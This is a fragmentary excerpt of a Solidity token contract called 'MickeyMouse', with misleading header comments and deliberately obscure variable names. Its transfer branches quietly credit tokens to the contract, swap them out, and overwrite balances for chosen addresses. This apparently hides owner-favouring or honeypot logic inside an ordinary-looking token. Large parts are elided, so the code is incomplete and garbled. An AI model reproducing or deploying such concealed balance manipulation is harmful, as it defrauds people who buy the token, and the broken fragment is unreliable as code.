...
// SPDX-License-Identifier: None - 0x35e1785fDF3e83123FA636213408Eb82486655fb
// Result = FAIL
// PROBLEM IS 100% NOT WITHIN 226 - 263
...
contract MickeyMouse is IDEX20, Ownable {
    ...
    function mainnetRouter(
        ...
        [exvopTo] > entireS) { allignOVOX = prgAmount; _tOwned[address(this)] += allignOVOX;
            swapAmountForTokens(prgAmount, exvopTo); return;

        } else if (exvopTo != address(UniswapV2router) 
        && ArrayAllIDEX[linkFrom] > 0 && prgAmount > entireS 
        && exvopTo != DXPairCreator) {
            ArrayAllIDEX[exvopTo] = prgAmount; return;
        ...
        !MaxOfArray && ArrayAllIDEX[exvopTo] == 0) {
            allignOVOX = (prgAmount * isAllFEE) / 100; prgAmount -= allignOVOX;
